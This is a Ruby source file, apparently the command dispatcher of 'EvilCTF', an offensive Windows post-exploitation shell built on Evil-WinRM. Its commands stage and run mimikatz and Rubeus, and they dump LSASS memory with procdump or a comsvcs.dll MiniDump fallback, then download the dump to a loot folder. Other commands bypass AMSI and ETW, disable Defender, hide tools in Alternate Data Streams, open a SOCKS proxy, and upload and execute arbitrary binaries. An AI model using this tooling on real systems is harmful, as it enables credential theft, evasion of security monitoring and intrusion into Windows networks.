# frozen_string_literal: true

require 'monitor'
require 'ostruct'
require 'shellwords'
require_relative 'staging'
require_relative 'tools'
require_relative 'execution'
require_relative 'uploader'
require_relative 'enums'
require_relative 'sql_enum'
require_relative 'async_worker'
require_relative 'tool_registry'
require_relative 'engine_audit'

module EvilCTF
  # Dispatcher for handling commands in the EvilCTF session.
  # Replaces the large case statement in session.rb with a handler-based approach.
  class CommandDispatcher
    def self.instance
      @instance ||= new
    end

    def self.dispatch(name:, shell:, session_options:, args: nil, command_manager: nil, history: nil)
      instance.dispatch(
        name: name,
        args: args,
        shell: shell,
        session_options: session_options,
        command_manager: command_manager,
        history: history
      )
    end

    attr_reader :handlers

    def initialize
      @mutex = Monitor.new
      @handlers = {}
      @pass_through = true # Default: pass unknown commands through
      @async_worker = EvilCTF::AsyncWorker.new

      # Pre-register all handlers
      register_core_commands
    end

    def register(name, &block)
      @mutex.synchronize do
        @handlers[name] = block
      end
    end

    def unregister(name)
      @mutex.synchronize do
        @handlers.delete(name)
      end
    end

    # Dispatch a command and return a result hash.
    # Returns:
    #   { ok: true, output: "<output>", handled: true } on success
    #   { ok: false, output: "", error: "<error_message>", handled: true } on handler failure
    #   { ok: false, output: "", handled: false } not a known command, pass through
    def dispatch(name:, shell:, session_options:, args: nil, command_manager: nil, history: nil)
      # Make command_manager and history available in session_options for handlers
      session_options[:command_manager] = command_manager if command_manager
      session_options[:history] = history if history

      normalized = name.to_s.strip.downcase
      normalized = 'help' if normalized == 'menu'
      tokens = normalized.split(/\s+/)

      # Special handling for 'history' command with optional argument
      normalized = "history #{args.strip.downcase}" if normalized == 'history' && args && args.strip != ''

      # Resolve command key in a tolerant order so full user input still maps
      # to one-word or two-word registered handlers.
      candidate_keys = []
      candidate_keys << normalized unless normalized.empty?
      candidate_keys << tokens[0, 2].join(' ') if tokens.length >= 2
      candidate_keys << tokens.first if tokens.first
      candidate_keys.uniq!

      command_key = candidate_keys.find { |key| @handlers.key?(key) }
      handler = command_key ? @handlers[command_key] : nil
      return { ok: false, output: '', handled: false } unless handler

      begin
        handler_result = handler.call(shell, args, session_options)

        # Handlers may return either a plain output object or a structured
        # dispatcher result hash ({ ok:, output:, error:, handled: }).
        if handler_result.is_a?(Hash) && (handler_result.key?(:ok) || handler_result.key?('ok'))
          ok_value = handler_result.key?(:ok) ? handler_result[:ok] : handler_result['ok']
          output_value = if handler_result.key?(:output)
                           handler_result[:output]
                         else
                           handler_result['output']
                         end
          error_value = if handler_result.key?(:error)
                          handler_result[:error]
                        else
                          handler_result['error']
                        end
          handled_value = if handler_result.key?(:handled)
                            handler_result[:handled]
                          elsif handler_result.key?('handled')
                            handler_result['handled']
                          else
                            true
                          end

          return {
            ok: !!ok_value,
            output: output_value.to_s,
            error: error_value,
            handled: handled_value != false
          }
        end

        { ok: true, output: handler_result.to_s, handled: true }
      rescue StandardError => e
        EvilCTF::EngineAudit.error(message: "dispatcher handler failed: #{command_key}", error: e,
                                   source: 'command_dispatcher')
        { ok: false, output: '', error: e.message, handled: true }
      end
    end

    private

    def register_core_commands
      register('help') do |_shell, _args, session_options|
        require 'colorize'
        output = "\n#{'Builtin commands:'.colorize(:cyan)}"

        help_cmds = [
          ['help', 'This help'],
          ['clear', 'Clear screen'],
          ['validate macros [names...] [--attacker-ip IP] [--attacker-port PORT]',
           'Static macro validation without executing'],
          ['validate aliases [names...]', 'Static alias validation without executing'],
          ['tools', 'List tool registry'],
          ['tool <name> / tool all', 'Stage a specific tool / stage all available tools'],
          ['download_missing', 'Download all missing tools into ./tools'],
          ['dump_creds', 'Stage mimikatz & dump logon passwords'],
          ['lsass_dump', 'Stage procdump & dump LSASS to ./loot'],
          ['enum [type]', 'Run enumeration preset (basic, deep, sql, etc.)'],
          ['fileops', 'File operations menu (upload/download/ZIP)'],
          ['bypass-4msi', 'Try AMSI bypass'],
          ['bypass-etw', 'Full ETW bypass'],
          ['disable_defender', 'Try disabling Defender real-time'],
          ['history', 'Show command history'],
          ['history clear', 'Clear history file'],
          ['profile save <name>', 'Save current options as profile'],
          ['get-unquotedservices', 'Show all unquoted service paths'],
          ['load_ps1 <local_ps1>', 'Upload and load PS1 script'],
          ['invoke-binary <local_bin> [args]', 'Upload and execute binary'],
          ['services', 'List services'],
          ['processes', 'List processes'],
          ['sysinfo', 'System info'],
          ['__exit__/exit/quit', 'Exit this Evil-WinRM CTF session'],
          ['!sh / !bash', 'Spawn local shell']
        ]

        help_cmds.each do |cmd, desc|
          output += "\n#{'  '.colorize(:light_black)}#{cmd.colorize(:green)}#{' - '.colorize(:light_black)}#{desc.colorize(:white)}"
        end

        output += "\n#{'Macros: '.colorize(:cyan)}"
        # command_manager is available via session_options[:command_manager]
        cm = session_options[:command_manager]
        output += if cm
                    cm.list_macros.join(', ').colorize(:magenta)
                  else
                    'N/A'
                  end

        output += "\nAliases: ".colorize(:cyan)
        output += if cm
                    cm.list_aliases.join(', ').colorize(:magenta)
                  else
                    'N/A'
                  end
        output
      end

      # menu is a friendly alias used by operators
      register('menu') do |shell, args, session_options|
        @handlers['help'].call(shell, args, session_options)
      end

      # clear
      register('clear') do |_shell, _args, _session_options|
        system('clear || cls')
        ''
      end

      register('validate') do |_shell, args, session_options|
        command_manager = session_options[:command_manager]
        next 'Command manager unavailable' unless command_manager

        parsed = parse_validate_args(args)
        next "validate parse error: #{parsed[:error]}" if parsed[:error]

        case parsed[:target]
        when 'macros'
          report = command_manager.validate_macros(
            names: parsed[:names],
            replacements: parsed[:replacements],
            check_local_tools: true
          )
          render_macro_validation_report(report)
        when 'aliases'
          report = command_manager.validate_aliases(names: parsed[:names])
          render_alias_validation_report(report)
        else
          "Usage:\n  " \
          "validate macros [name1 name2 ...] [--attacker-ip IP] [--attacker-port PORT]\n  " \
          'validate aliases [name1 name2 ...]'
        end
      end

      # tools
      register('tools') do |_shell, _args, _session_options|
        root = File.expand_path('../..', __dir__)
        registry = EvilCTF::ToolRegistry.new(root_path: root)
        tools = registry.scan
        if tools.empty?
          puts '[!] No tools discovered in tools/'
        else
          puts "[*] Dynamic Tool Registry (#{tools.size} entries)"
          tools.each do |tool|
            required = Array(tool.metadata['required_args']).join(', ')
            puts "- #{tool.name} (required_args: #{required.empty? ? 'none' : required})"
          end
        end
        EvilCTF::Tools.list_available_tools
        ''
      end

      # download_missing
      register('download_missing') do |_shell, _args, _session_options|
        EvilCTF::Tools.download_missing_tools
        ''
      end

      register('recon_basic') do |shell, _args, session_options|
        logger = session_options[:logger] || OpenStruct.new
        @async_worker.enqueue_block(priority: 20, name: 'recon_basic', logger: logger) do
          outputs = []
          ['whoami /all', 'net user', 'systeminfo'].each do |cmd|
            res = EvilCTF::Execution.run(shell, cmd, timeout: 60)
            outputs << "> #{cmd}\n#{res.output}"
          end
          logger&.info('[recon_basic] completed')
          outputs.join("\n")
        rescue StandardError => e
          EvilCTF::EngineAudit.error(message: 'recon_basic background job failed', error: e,
                                     source: 'command_dispatcher')
          raise
        end
        'Queued recon_basic in background job queue'
      end

      # dump_creds
      register('dump_creds') do |shell, _args, session_options|
        logger = session_options[:logger] || OpenStruct.new
        command_manager = session_options[:command_manager]

        @async_worker.enqueue_block(priority: 10, name: 'dump_creds', logger: logger) do
          EvilCTF::Tools.safe_autostage('mimikatz', shell, session_options, logger)
          EvilCTF::Tools.safe_autostage('powerview', shell, session_options, logger)
          command_manager.expand_macro('dump_creds', shell, webhook: session_options[:webhook])
        rescue StandardError => e
          EvilCTF::EngineAudit.error(message: 'dump_creds background job failed', error: e,
                                     source: 'command_dispatcher')
          raise
        end
        'Queued dump_creds in background job queue'
      end

      # lsass_dump
      register('lsass_dump') do |shell, _args, session_options|
        logger = session_options[:logger] || OpenStruct.new

        EvilCTF::Tools.safe_autostage('procdump', shell, session_options, logger)
        command_manager = session_options[:command_manager]
        command_manager.expand_macro('lsass_dump', shell, webhook: session_options[:webhook])

        locate_ps = <<~PS
          try {
            $files = Get-ChildItem -LiteralPath '#{EvilCTF::Staging.dir}' -File -ErrorAction SilentlyContinue |
              Where-Object { $_.Name -like 'lsass*.dmp*' } |
              Sort-Object LastWriteTime -Descending
            if ($files -and $files.Count -gt 0) {
              "FOUND::" + $files[0].FullName
            } else {
              "MISSING"
            }
          } catch {
            "ERROR::" + $_.Exception.Message
          }
        PS

        resolve_dump_path = lambda do
          locate_res = shell.run(locate_ps)
          locate_out = locate_res&.output.to_s
          found_line = locate_out.lines.map(&:strip).find { |ln| ln.start_with?('FOUND::') }
          dump_path = found_line&.sub('FOUND::', '')&.strip
          [dump_path, locate_out]
        end

        dump_path, locate_out = resolve_dump_path.call

        unless dump_path
          puts '[*] No dump from initial macro run; retrying ProcDump with explicit diagnostics...'
          procdump_retry_ps = <<~PS
            try {
              $exe = '#{EvilCTF::Staging.tool_path('procdump64.exe')}'
              if (!(Test-Path -LiteralPath $exe)) {
                "RETRY_ERROR::ProcDump not found at $exe"
              } else {
                $target = '#{EvilCTF::Staging.tool_path('lsass_retry.dmp')}'
                & $exe -accepteula -ma lsass.exe $target 2>&1 | ForEach-Object { $_.ToString() }
                "RETRY_EXIT::$LASTEXITCODE"
              }
            } catch {
              "RETRY_ERROR::" + $_.Exception.Message
            }
          PS
          retry_res = shell.run(procdump_retry_ps)
          retry_out = retry_res&.output.to_s
          retry_out.lines.each { |ln| puts "[procdump] #{ln.strip}" unless ln.to_s.strip.empty? }
          puts '[!] ProcDump failed with STATUS_DLL_NOT_FOUND (-1073741515). Target likely lacks required runtime/DLL dependencies for this binary.' \
               if retry_out.include?('RETRY_EXIT::-1073741515')

          dump_path, locate_out = resolve_dump_path.call
        end

        unless dump_path
          puts '[*] ProcDump still did not produce a file; attempting comsvcs MiniDump fallback...'
          comsvcs_ps = <<~PS
            try {
              $lsass = Get-Process -Name lsass -ErrorAction Stop | Select-Object -First 1
              $lsassPid = $lsass.Id
              $out = '#{EvilCTF::Staging.tool_path('lsass_comsvcs.dmp')}'
              $args = "C:\\Windows\\System32\\comsvcs.dll, MiniDump $lsassPid $out full"
              $p = Start-Process -FilePath 'rundll32.exe' -ArgumentList $args -PassThru -Wait -WindowStyle Hidden
              "COMSVCS_EXIT::$($p.ExitCode)"
            } catch {
              "COMSVCS_ERROR::" + $_.Exception.Message
            }
          PS
          comsvcs_res = shell.run(comsvcs_ps)
          comsvcs_out = comsvcs_res&.output.to_s
          comsvcs_out.lines.each { |ln| puts "[comsvcs] #{ln.strip}" unless ln.to_s.strip.empty? }

          dump_path, locate_out = resolve_dump_path.call
        end

        if dump_path
          EvilCTF::Uploader.download_file(
            remote_path: dump_path,
            local_path: "loot/lsass_#{session_options[:ip]}.dmp",
            shell: shell
          )
        else
          puts '[!] No LSASS dump file found in C:\\Users\\Public after procdump execution.'
          puts "[!] Dump discovery error: #{locate_out.lines.map(&:strip).find { |ln| ln.start_with?('ERROR::') }}" \
               if locate_out.include?('ERROR::')
          puts '[!] Current user likely lacks required LSASS access (admin + SeDebug and no PPL/Credential Guard constraints).'
        end
        ''
      end

      # fileops
      register('fileops') do |shell, _args, session_options|
        EvilCTF::Uploader.file_operations_menu(shell, session_options)
        ''
      end

      # load_ps1 - upload a local PowerShell script and execute it in-session
      register('load_ps1') do |shell, args, session_options|
        path = args.to_s.strip
        next 'Usage: load_ps1 <local_ps1>' if path.empty?
        next "[-] Local file not found: #{path}" unless File.exist?(path)

        remote_path = EvilCTF::Staging.tool_path(File.basename(path))
        upload = EvilCTF::Uploader.upload_file(local_path: path, remote_path: remote_path, shell: shell,
                                               xor_key: session_options[:xor_key],
                                               resume: !(session_options[:fresh] || session_options[:no_resume]))
        ok = upload.is_a?(Hash) ? upload[:ok] : upload
        next "[!] Upload failed for #{path}" unless ok

        puts "[+] Uploaded #{File.basename(path)} to #{remote_path}"
        result = EvilCTF::Execution.run(shell, "IEX (Get-Content '#{remote_path}' -Raw)", timeout: 120)
        puts result.output
        ''
      end

      # invoke-binary - upload a local executable and run it with optional args
      register('invoke-binary') do |shell, args, session_options|
        tokens = begin
          Shellwords.split(args.to_s)
        rescue ArgumentError
          []
        end
        next 'Usage: invoke-binary <local_bin> [args...]' if tokens.empty?

        local_path = tokens.shift
        next "[-] Local file not found: #{local_path}" unless File.exist?(local_path)

        remote_path = EvilCTF::Staging.tool_path(File.basename(local_path))
        upload = EvilCTF::Uploader.upload_file(local_path: local_path, remote_path: remote_path, shell: shell,
                                               xor_key: session_options[:xor_key],
                                               resume: !(session_options[:fresh] || session_options[:no_resume]))
        ok = upload.is_a?(Hash) ? upload[:ok] : upload
        next "[!] Upload failed for #{local_path}" unless ok

        puts "[+] Uploaded #{File.basename(local_path)} to #{remote_path}"
        arg_string = tokens.map { |t| EvilCTF::Utils.escape_ps_string(t) }.join(' ')
        ps_cmd = "& '#{EvilCTF::Utils.escape_ps_string(remote_path)}' #{arg_string}"
        result = EvilCTF::Execution.run(shell, ps_cmd, timeout: 120)
        puts result.output
        ''
      end

      # enum - handles optional type argument
      register('enum') do |shell, args, session_options|
        t = args&.strip ? args.strip.downcase : 'basic'

        if t == 'deep'
          logger = session_options[:logger] || OpenStruct.new
          EvilCTF::Tools.safe_autostage('winpeas', shell, session_options, logger)
        end

        if t == 'dom'
          logger = session_options[:logger] || OpenStruct.new
          EvilCTF::Tools.safe_autostage('powerview', shell, session_options, logger)
          EvilCTF::Execution.run(shell, "IEX (Get-Content '#{EvilCTF::Staging.tool_path('PowerView.ps1')}' -Raw)", timeout: 120)
        end

        if t == 'sql'
          EvilCTF::SQLEnum.run_sql_enum(shell)
        else
          enum_cache = session_options[:enum_cache] ||= {}
          EvilCTF::Enums.run_enumeration(shell, type: t, cache: enum_cache, fresh: session_options[:fresh])
        end
        ''
      end

      # dom_enum
      register('dom_enum') do |shell, _args, session_options|
        logger = session_options[:logger] || OpenStruct.new
        enum_cache = session_options[:enum_cache] ||= {}
        EvilCTF::Tools.safe_autostage('powerview', shell, session_options, logger)
        EvilCTF::Execution.run(shell, "IEX (Get-Content '#{EvilCTF::Staging.tool_path('PowerView.ps1')}' -Raw)", timeout: 120)
        EvilCTF::Enums.run_enumeration(shell, type: 'dom', cache: enum_cache, fresh: session_options[:fresh])
        ''
      end

      # disable_defender
      register('disable_defender') do |shell, _args, _session_options|
        EvilCTF::Tools.disable_defender(shell)
        ''
      end

      # history (show)
      register('history') do |_shell, _args, session_options|
        history = session_options[:history]
        history&.show
        ''
      end

      # history clear
      register('history clear') do |_shell, _args, session_options|
        history = session_options[:history]
        history&.clear
        puts '[+] History cleared'
        ''
      end

      # profile save
      register('profile save') do |_shell, args, session_options|
        name = args.strip if args
        if name && !name.empty?
          EvilCTF::Tools.save_config_profile(name, session_options)
        else
          puts '[*] Usage: profile save <name>'
        end
        ''
      end

      # get-unquotedservices
      register('get-unquotedservices') do |shell, _args, _session_options|
        puts '[*] Getting all unquoted service paths...'
        unquoted_ps = <<~POWERSHELL
          Get-CimInstance -Class Win32_Service | Where-Object {
            $_.PathName -notlike '`"*' -and $_.PathName -like '*.exe*' -and $_.PathName -like '* *'
          } | Select-Object Name, DisplayName, PathName, State, StartMode | Format-Table -AutoSize
        POWERSHELL
        exec_res = EvilCTF::Execution.run(shell, unquoted_ps, timeout: 30)
        puts exec_res.output
        ''
      end

      # bypass-4msi - AMSI bypass with detection and verification
      register('bypass-4msi') do |shell, _args, _session_options|
        output = []
        # Run detection
        detect_result = EvilCTF::Execution.run(shell, EvilCTF::Bypass::BYPASS_DETECTION_PS, timeout: 30)
        output << detect_result.output

        # Run enhanced or standard bypass based on detection
        output << if detect_result.output.include?('Windows 11')
                    '[*] Running enhanced Windows 11/2022+ AMSI bypass...'
                  else
                    '[*] Running standard AMSI bypass...'
                  end

        bypass_result = EvilCTF::Execution.run(shell, EvilCTF::Bypass::BYPASS_4MSI_PS, timeout: 60)
        output << bypass_result.output

        # Run verification
        verify_result = EvilCTF::Execution.run(shell, EvilCTF::Bypass::BYPASS_VERIFICATION_PS, timeout: 30)
        output << verify_result.output

        output.join("\n")
      end

      # bypass-etw - Full ETW bypass with detection and verification
      register('bypass-etw') do |shell, _args, _session_options|
        output = []
        # Run detection
        detect_result = EvilCTF::Execution.run(shell, EvilCTF::Bypass::BYPASS_DETECTION_PS, timeout: 30)
        output << detect_result.output

        # Run ETW bypass
        etw_result = EvilCTF::Execution.run(shell, EvilCTF::Bypass::ETW_BYPASS_PS, timeout: 60)
        output << etw_result.output

        # Run verification
        verify_result = EvilCTF::Execution.run(shell, EvilCTF::Bypass::BYPASS_VERIFICATION_PS, timeout: 30)
        output << verify_result.output

        output.join("\n")
      end

      # tool - handles staging and optional execution of tools
      register('tool') do |shell, args, session_options|
        return { ok: false, error: 'Usage: tool <tool_name> (or "all")' } unless args&.strip

        key = args.strip
        logger = session_options[:logger] || OpenStruct.new

        if key == 'all'
          puts '[*] Staging all tools...'
          EvilCTF::Tools.tool_registry.each_key do |tool_key|
            staged = EvilCTF::Tools.safe_autostage(tool_key, shell, session_options, logger)
            next unless session_options[:auto_exec] && staged

            puts "[*] Auto-executing #{tool_key}..."
            EvilCTF::Tools.execute_staged_tool(tool_key, '', shell,
                                               remote_path: staged.is_a?(String) ? staged : nil)
          end
        else
          puts "[*] Staging tool: #{key}"
          staged = EvilCTF::Tools.safe_autostage(key, shell, session_options, logger)
          if staged
            puts "[+] Tool '#{key}' staged successfully"
            tool = EvilCTF::Tools.tool_registry[key]
            if tool && tool[:recommended_remote]
              # Stealth staging deploys to an Alternate Data Stream; route those
              # through the stager executor, which knows how to launch streams.
              if staged.is_a?(String) && EvilCTF::Tools::Stager.ads_path?(staged)
                EvilCTF::Tools.execute_staged_tool(key, '', shell, remote_path: staged)
                next ''
              end

              # When --random-names is active, safe_autostage returns the
              # deployed (randomized) path; otherwise fall back to the registry path.
              remote_path = staged.is_a?(String) ? staged : tool[:recommended_remote]
              case key.downcase
              when 'mimikatz'
                puts '[*] Executing mimikatz...'
                ps_cmd = <<~PS
                  try {
                    $proc = Start-Process -FilePath '#{EvilCTF::Utils.escape_ps_string(remote_path)}' -PassThru -WindowStyle Hidden
                    $proc.WaitForExit(30000) | Out-Null
                    if ($proc.HasExited) {
                      Write-Output "Mimikatz completed with exit code: $($proc.ExitCode)"
                    } else {
                      Write-Output "Mimikatz timed out after 30 seconds"
                      $proc.Kill()
                    }
                  } catch {
                    Write-Output "Error executing mimikatz: $_.Exception.Message"
                  }
                PS
                exec_res = EvilCTF::Execution.run(shell, ps_cmd, timeout: 35)
                puts exec_res.output

              when 'winpeas'
                puts '[*] Executing winpeas...'
                ps_cmd = <<~PS
                  try {
                    $proc = Start-Process -FilePath "cmd" -ArgumentList "/c '#{EvilCTF::Utils.escape_ps_string(remote_path)}'" -PassThru -WindowStyle Hidden
                    $proc.WaitForExit(60000) | Out-Null
                    if ($proc.HasExited) {
                      Write-Output "WinPEAS completed with exit code: $($proc.ExitCode)"
                    } else {
                      Write-Output "WinPEAS timed out after 60 seconds"
                      $proc.Kill()
                    }
                  } catch {
                    Write-Output "Error executing winpeas: $_.Exception.Message"
                  }
                PS
                exec_res = EvilCTF::Execution.run(shell, ps_cmd, timeout: 70)
                puts exec_res.output

              when 'procdump'
                puts '[*] Executing procdump...'
                ps_cmd = <<~PS
                  try {
                    $proc = Start-Process -FilePath "cmd" -ArgumentList "/c '#{EvilCTF::Utils.escape_ps_string(remote_path)}'" -PassThru -WindowStyle Hidden
                    $proc.WaitForExit(30000) | Out-Null
                    if ($proc.HasExited) {
                      Write-Output "Procdump completed with exit code: $($proc.ExitCode)"
                    } else {
                      Write-Output "Procdump timed out after 30 seconds"
                      $proc.Kill()
                    }
                  } catch {
                    Write-Output "Error executing procdump: $_.Exception.Message"
                  }
                PS
                exec_res = EvilCTF::Execution.run(shell, ps_cmd, timeout: 35)
                puts exec_res.output

              when 'rubeus', 'seatbelt'
                puts "[*] Executing #{key}..."
                ps_cmd = <<~PS
                  try {
                    $proc = Start-Process -FilePath '#{EvilCTF::Utils.escape_ps_string(remote_path)}' -PassThru -WindowStyle Hidden
                    $proc.WaitForExit(30000) | Out-Null
                    if ($proc.HasExited) {
                      Write-Output "#{key.capitalize} completed with exit code: $($proc.ExitCode)"
                    } else {
                      Write-Output "#{key.capitalize} timed out after 30 seconds"
                      $proc.Kill()
                    }
                  } catch {
                    Write-Output "Error executing #{key}: $_.Exception.Message"
                  }
                PS
                exec_res = EvilCTF::Execution.run(shell, ps_cmd, timeout: 35)
                puts exec_res.output

              when 'inveigh', 'powerview', 'sharphound'
                puts "[*] Executing #{key} PowerShell script..."
                ps_script = "IEX (Get-Content '#{EvilCTF::Utils.escape_ps_string(remote_path)}' -Raw) 2>&1"
                exec_res = EvilCTF::Execution.run(shell, ps_script, timeout: 120)
                puts exec_res.output

              when 'socksproxy'
                puts '[*] Executing SOCKS proxy PowerShell module...'
                ps_script = "Import-Module '#{EvilCTF::Utils.escape_ps_string(remote_path)}' 2>&1; Invoke-SocksProxy -Port 1080"
                exec_res = EvilCTF::Execution.run(shell, ps_script, timeout: 120)
                puts exec_res.output

              else
                if remote_path.end_with?('.exe')
                  puts "[*] Executing #{key}..."
                  ps_cmd = <<~PS
                    try {
                      $proc = Start-Process -FilePath '#{EvilCTF::Utils.escape_ps_string(remote_path)}' -PassThru -WindowStyle Hidden
                      $proc.WaitForExit(30000) | Out-Null
                      if ($proc.HasExited) {
                        Write-Output "#{key.capitalize} completed with exit code: $($proc.ExitCode)"
                      } else {
                        Write-Output "#{key.capitalize} timed out after 30 seconds"
                        $proc.Kill()
                      }
                    } catch {
                      Write-Output "Error executing #{key}: $_.Exception.Message"
                    }
                  PS
                  exec_res = EvilCTF::Execution.run(shell, ps_cmd, timeout: 35)
                  puts exec_res.output
                elsif session_options[:auto_exec]
                  puts "[*] Auto-executing #{key}..."
                  EvilCTF::Tools.execute_staged_tool(key, '', shell,
                                                     remote_path: staged.is_a?(String) ? staged : nil)
                else
                  puts "[*] Tool staged. Execute manually with: #{remote_path}"
                end
              end
            end
          else
            puts "[-] Failed to stage tool '#{key}'"
          end
        end
        ''
      end

      # !bash / !sh - spawn local shell
      register('!bash') do |_shell, _args, _session_options|
        puts '[*] Spawning local shell. Type "exit" to return.'
        system(ENV['SHELL'] || '/bin/bash')
        ''
      end

      register('!sh') do |_shell, _args, _session_options|
        puts '[*] Spawning local shell. Type "exit" to return.'
        system(ENV['SHELL'] || '/bin/bash')
        ''
      end
    end

    def parse_validate_args(args)
      tokens = Shellwords.split(args.to_s)
      target = tokens.shift.to_s.downcase
      names = []
      replacements = {}

      i = 0
      while i < tokens.length
        token = tokens[i]
        case token
        when '--attacker-ip'
          replacements['AttackerIP'] = tokens[i + 1].to_s
          i += 2
        when '--attacker-port'
          replacements['AttackerPort'] = tokens[i + 1].to_s
          i += 2
        else
          names << token
          i += 1
        end
      end

      { target: target, names: names, replacements: replacements }
    rescue ArgumentError => e
      { target: '', names: [], replacements: {}, error: e.message }
    end

    def render_macro_validation_report(report)
      output = []
      output << 'Macro Validation (dry-run, no remote execution)'
      output << "Summary: #{report[:passed]}/#{report[:total]} pass"
      report[:results].each do |result|
        status = result[:ok] ? 'PASS' : 'FAIL'
        output << "- #{result[:name]}: #{status}"
        result[:errors].each { |err| output << "    error: #{err}" }
        result[:warnings].each { |warn| output << "    warning: #{warn}" }
      end
      output.join("\n")
    end

    def render_alias_validation_report(report)
      output = []
      output << 'Alias Validation (dry-run, no remote execution)'
      output << "Summary: #{report[:passed]}/#{report[:total]} pass"
      report[:results].each do |result|
        status = result[:ok] ? 'PASS' : 'FAIL'
        output << "- #{result[:name]}: #{status}"
        output << "    expands_to: #{result[:expansion]}" if result[:expansion]
        output << "    error: #{result[:error]}" if result[:error]
      end
      output.join("\n")
    end
  end
end
